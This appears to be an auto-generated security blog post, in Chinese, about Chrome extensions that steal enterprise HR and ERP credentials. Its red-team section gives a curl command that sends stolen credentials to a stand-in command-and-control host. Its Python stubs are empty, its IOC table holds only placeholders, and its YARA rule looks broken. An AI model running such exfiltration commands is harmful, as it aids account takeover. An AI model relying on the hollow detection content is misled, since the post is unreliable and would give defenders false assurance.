---
layout: post
title:  "Credential-stealing Chrome extensions target enterprise HR platforms"
date:   2026-01-18 02:42:25 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Chrome 擴充功能的企業 HR 和 ERP 平台攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: Credential Theft 和 Session Hijacking
> * **關鍵技術**: Cookie Exfiltration, DOM Manipulation, Bidirectional Cookie Injection

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Chrome 擴充功能的惡意程式碼可以透過 cookie exfiltration、DOM manipulation 和 bidirectional cookie injection 等方法竊取企業 HR 和 ERP 平台的認證憑證。
* **攻擊流程圖解**:
  1. 使用者安裝惡意 Chrome 擴充功能。
  2. 惡意程式碼竊取使用者的認證憑證（例如 Workday、NetSuite 和 SAP SuccessFactors）。
  3. 認證憑證被傳送到遠端命令和控制（C2）伺服器。
  4. 攻擊者使用竊取的認證憑證進行 session hijacking。
* **受影響元件**: Chrome 擴充功能、Workday、NetSuite 和 SAP SuccessFactors。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 使用者需要安裝惡意 Chrome 擴充功能。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    #竊取認證憑證
    def steal_credentials():
      # ...
    
    #傳送認證憑證到 C2 伺服器
    def send_credentials_to_c2(credentials):
      # ...
    
    #進行 session hijacking
    def hijack_session(credentials):
      # ...
    
    ```
  *範例指令*: 使用 `curl` 命令傳送竊取的認證憑證到 C2 伺服器。

```

bash
curl -X POST -H "Content-Type: application/json" -d '{"credentials": "..."}' https://c2-server.com/credentials

```
* **繞過技術**: 使用 DOM manipulation 和 bidirectional cookie injection 等方法繞過安全控制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| ... | ... | ... | ... |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Chrome_Extension_Malware {
      meta:
        description = "Detects malicious Chrome extensions"
      strings:
        $a = "chrome-extension://"
      condition:
        $a in (pe.sections[0].data)
    }
    
    ```
  或者是使用 Splunk 查詢語法進行偵測。

```

spl
index=web_logs sourcetype=chrome_extension_logs | search "chrome-extension://" | stats count as num_events by src_ip

```
* **緩解措施**: 更新 Chrome 和相關擴充功能，使用安全的認證憑證存儲和傳輸方法。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Cookie Exfiltration**: 惡意程式碼竊取使用者的 cookie 資料，通常用於 session hijacking。
* **DOM Manipulation**: 惡意程式碼修改網頁的 DOM 結構，通常用於繞過安全控制。
* **Bidirectional Cookie Injection**: 惡意程式碼在使用者的瀏覽器中注入 cookie 資料，通常用於 session hijacking。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/credential-stealing-chrome-extensions-target-enterprise-hr-platforms/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1539/)


